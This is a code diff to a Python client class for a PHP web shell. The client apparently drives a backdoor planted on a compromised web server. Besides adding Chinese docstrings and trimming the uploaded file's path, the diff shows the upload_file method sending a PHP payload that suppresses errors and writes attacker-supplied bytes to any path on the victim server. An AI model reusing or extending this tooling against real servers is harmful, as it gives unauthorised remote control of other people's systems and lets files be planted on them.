@@ -110,7 +110,10 @@ class Shell:
         return resp.content.decode(self.coding)
 
     def mkdir(self, folder_name='', dir_path= ''):
-        """新建文件夹"""
+        """新建文件夹
+            @:param folder_name: 新建文件夹名称
+            @:param dir_path: 新建文件夹所在父目录
+        """
         if not dir_path:
             dir_path = self.current_dir_path
         if not folder_name:
@@ -142,13 +145,16 @@ class Shell:
         return resp.content.decode(self.coding)
 
     def upload_file(self, file_name, dir_path=''):
-        """上传文件"""
+        """上传文件
+            @:param file_name: 文件所在路径
+            @:param dir_path: 上传目的文件夹
+        """
         if not dir_path:
             dir_path = self.current_dir_path
         functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$f='""" + \
-                          dir_path + self.separator + file_name + \
+                          dir_path + self.separator + file_name.split('/')[-1] + \
                           r"""';$c=$_POST["z1"];$c=str_replace("\r","",$c);$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode('%'.substr($c,$i,2));echo(@fwrite(fopen($f,'w'),$buf)?'1':'0');;echo("X@Y");die();"""
-        data = self.generate_post_data(functional_code,file_name)
+        data = self.generate_post_data(functional_code, file_name)
         resp = self.post_data(data)
         if resp.status_code == 200:
             match = self.datarule.search(resp.content.decode(self.coding))
